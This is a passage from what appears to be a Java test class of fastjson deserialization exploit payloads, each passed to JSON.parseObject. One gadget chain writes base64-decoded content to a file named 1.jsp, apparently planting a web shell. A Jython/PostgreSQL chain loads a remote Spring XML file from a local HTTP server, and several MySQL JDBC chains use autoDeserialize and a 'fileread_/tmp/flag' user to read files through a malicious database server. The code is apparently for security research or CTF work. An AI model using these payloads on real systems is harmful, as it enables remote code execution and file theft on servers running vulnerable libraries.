                + "			\"node\": {\r\n"
                + "				\"@type\": \"ognl.ASTMethod\",\r\n"
                + "				\"p\": {\r\n"
                + "					\"@type\": \"ognl.OgnlParser\",\r\n"
                + "					\"stream\": {\r\n"
                + "  \"@type\":\"org.apache.commons.io.input.BOMInputStream\",\r\n"
                + "  \"delegate\":{\r\n"
                + "    \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\r\n"
                + "    \"input\":{\r\n"
                + "      \"@type\": \"org.apache.commons.codec.binary.Base64InputStream\",\r\n"
                + "      \"in\":{\r\n"
                + "        \"@type\":\"org.apache.commons.io.input.CharSequenceInputStream\",\r\n"
                + "        \"charset\":\"utf-8\",\r\n"
                + "        \"bufferSize\": 1024,\r\n"
                + "        \"s\":{\"@type\":\"java.lang.String\"\""+baseStr+"\"\r\n"
                + "      },\r\n"
                + "      \"doEncode\":false,\r\n"
                + "      \"lineLength\":1024,\r\n"
                + "      \"lineSeparator\":\"5ZWKCg==\",\r\n"
                + "      \"decodingPolicy\":0\r\n"
                + "    },\r\n"
                + "    \"branch\":{\r\n"
                + "      \"@type\":\"org.eclipse.core.internal.localstore.SafeFileOutputStream\",\r\n"
                + "      \"targetPath\":\"1.jsp\"\r\n"
                + "    },\r\n"
                + "    \"closeBranch\":true\r\n"
                + "  },\r\n"
                + "  \"include\":true,\r\n"
                + "  \"boms\":[{\r\n"
                + "                  \"@type\": \"org.apache.commons.io.ByteOrderMark\",\r\n"
                + "                  \"charsetName\": \"UTF-8\",\r\n"
                + "                  \"bytes\":"+Arrays.toString(bytes)+"\r\n"
                + "                }],\r\n"
                + "}\r\n"
                + "				}\r\n"
                + "			}\r\n"
                + "		},\r\n"
                + "		\"su17\": {\r\n"
                + "			\"$ref\": \"$.su16.node.p.stream\"\r\n"
                + "		},\r\n"
                + "		\"su18\": {\r\n"
                + "			\"$ref\": \"$.su17.bOM.bytes\"\r\n"
                + "		}\r\n"
                + "	}";
        System.out.println(payload);
        JSON.parseObject(payload);
    }

    @Test
    public void jython_psql(){
        String payload  = "{\n" +
                "\"a\":{\n" +
                "\"@type\":\"java.lang.Exception\",\n" +
                "\"@type\":\"org.python.antlr.ParseException\",\n" +
                "},\n" +
                "\"b\":{\n" +
                "\"@type\":\"java.lang.Class\",\n" +
                "\"val\":{\"@type\":\"java.lang.String\"{\"@type\":\"java.util.Locale\",\"val\":{\"@type\":\"com.alibaba.fastjson.JSONObject\",{\"@type\":\"java.lang.String\"\"@type\":\"org.python.antlr.ParseException\",\n" +
                "\"type\":{}}}\n" +
                "},\n" +
                "\"c\":{\n" +
                "\"@type\":\"org.python.core.PyObject\",\n" +
                "\"@type\":\"com.ziclix.python.sql.PyConnection\",\n" +
                "\"connection\":{\n" +
                "\"@type\":\"org.postgresql.jdbc.PgConnection\",\n" +
                "\"hostSpecs\":[{\"host\":\"127.0.0.1\",\"port\":2333}],\n" +
                "\"user\":\"user\",\n" +
                "\"database\":\"test\",\n" +
                "\"info\":{\n" +
                "\"socketFactory\":\"org.springframework.context.support.ClassPathXmlApplicationContext\",\n" +
                "\"socketFactoryArg\":\"http://127.0.0.1:1234/exp.xml\"\n" +
                "},\n" +
                "\"url\":\"\"\n" +
                "}\n" +
                "}\n" +
                "}";
        JSON.parseObject(payload);
    }

    @Test
    public void jython_mysql(){
        // 5
        String payload  = "{\n" +
                "\"a\":{\n" +
                "\"@type\":\"java.lang.Exception\",\n" +
                "\"@type\":\"org.python.antlr.ParseException\",\n" +
                "},\n" +
                "\"b\":{\n" +
                "\"@type\":\"java.lang.Class\",\n" +
                "\"val\":{\"@type\":\"java.lang.String\"{\"@type\":\"java.util.Locale\",\"val\":{\"@type\":\"com.alibaba.fastjson.JSONObject\",{\"@type\":\"java.lang.String\"\"@type\":\"org.python.antlr.ParseException\",\n" +
                "\"type\":{}}}\n" +
                "},\n" +
                "\"c\":{\n" +
                "\"@type\":\"org.python.core.PyObject\",\n" +
                "\"@type\":\"com.ziclix.python.sql.PyConnection\",\n" +
                "\"connection\":{\n" +
                "\"@type\": \"com.mysql.jdbc.JDBC4Connection\",\n" +
                "    \"hostToConnectTo\": \"127.0.0.1\",\n" +
                "    \"portToConnectTo\": 3306,\n" +
                "    \"info\": {\n" +
                "        \"user\": \"fileread_/tmp/flag\",\n" +
                "        \"password\": \"pass\",\n" +
                "        \"statementInterceptors\": \"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\n" +
                "        \"autoDeserialize\": \"true\",\n" +
                "        \"NUM_HOSTS\": \"1\",\n" +
                "        \"maxAllowedPacket\":\"655360\"\n" +
                "    },\n" +
                "    \"databaseToConnectTo\": \"dbname\",\n" +
                "    \"url\": \"\"\n" +
                "}\n" +
                "}\n" +
                "}";

        // 6
        payload = "{\n" +
                "\"a\":{\n" +
                "\"@type\":\"java.lang.Exception\",\n" +
                "\"@type\":\"org.python.antlr.ParseException\",\n" +
                "},\n" +
                "\"b\":{\n" +
                "\"@type\":\"java.lang.Class\",\n" +
                "\"val\":{\"@type\":\"java.lang.String\"{\"@type\":\"java.util.Locale\",\"val\":{\"@type\":\"com.alibaba.fastjson.JSONObject\",{\"@type\":\"java.lang.String\"\"@type\":\"org.python.antlr.ParseException\",\n" +
                "\"type\":{}}}\n" +
                "},\n" +
                "\"c\":{\n" +
                "\"@type\":\"org.python.core.PyObject\",\n" +
                "\"@type\":\"com.ziclix.python.sql.PyConnection\",\n" +
                "\"connection\":{\n" +
                "\"@type\":\"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\",\n" +
                "\"proxy\": {\n" +
                "        \"connectionString\": {\n" +
                "            \"url\": \"jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=fileread_/tmp/flag\"\n" +
                "        }\n" +
                "    }\n" +
                "}\n" +
                "}\n" +
                "}";

        // 8
        payload = "{\n" +
                "\"a\":{\n" +
                "\"@type\":\"java.lang.Exception\",\n" +
                "\"@type\":\"org.python.antlr.ParseException\",\n" +
                "},\n" +
                "\"b\":{\n" +
                "\"@type\":\"java.lang.Class\",\n" +
                "\"val\":{\"@type\":\"java.lang.String\"{\"@type\":\"java.util.Locale\",\"val\":{\"@type\":\"com.alibaba.fastjson.JSONObject\",{\"@type\":\"java.lang.String\"\"@type\":\"org.python.antlr.ParseException\",\n" +
                "\"type\":{}}}\n" +
                "},\n" +
                "\"c\":{\n" +
                "\"@type\":\"org.python.core.PyObject\",\n" +
                "\"@type\":\"com.ziclix.python.sql.PyConnection\",\n" +
                "\"connection\":{\n" +
                "\"@type\":\"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection\",\n" +
                "\"proxy\":{\n" +
                "\"@type\":\"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy\",\n" +
                "\"connectionUrl\":{\n" +
                "\"@type\":\"com.mysql.cj.conf.url.ReplicationConnectionUrl\",\n" +
                "\"masters\":[{\"host\":\"127.0.0.1\"}],\n" +
                "\"slaves\":[],\n" +
                "\"properties\":{\n" +
                "\"host\":\"127.0.0.1\",\n" +
                "\"port\":\"3306\",\n" +
                "\"connectionAttributes\":\"t:cb32\",\n" +
                "\"user\":\"fileread_/tmp/flag\",\n" +
                "\"dname\":\"dname\",\n" +
                "\"password\":\"password\",\n" +
                "\"queryInterceptors\":\"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\",\n" +
                "\"autoDeserialize\":\"true\",\n" +
                "\"allowLoadLocalInfile\":\"true\"\n" +
                "}\n" +
                "}\n" +
                "}\n" +
                "}\n" +
                "}\n" +
                "}";
        JSON.parseObject(payload);
    }
}
